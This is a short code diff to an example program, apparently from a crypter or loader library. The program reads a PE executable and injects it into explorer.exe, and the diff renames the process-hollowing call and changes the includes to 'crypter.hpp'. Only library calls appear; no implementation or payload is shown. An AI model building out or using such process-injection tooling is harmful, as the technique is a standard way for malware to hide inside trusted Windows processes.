@@ -2,8 +2,7 @@
  * example_inject.cpp
  **/
 
-#include "unpack.h"
-#include "hollow.h"
+#include "crypter.hpp"
 
 int main(int argc, char **argv)
 {
@@ -12,7 +11,7 @@ int main(int argc, char **argv)
     pe_data_read(&pe_data, "data/sample.exe");
 
     /* inject pe via process hollowing */
-    pe_data_hollow(&pe_data, "C:\\Windows\\explorer.exe");
+    pe_data_inject(&pe_data, "C:\\Windows\\explorer.exe");
 
     pe_data_free(&pe_data);
     return 0;
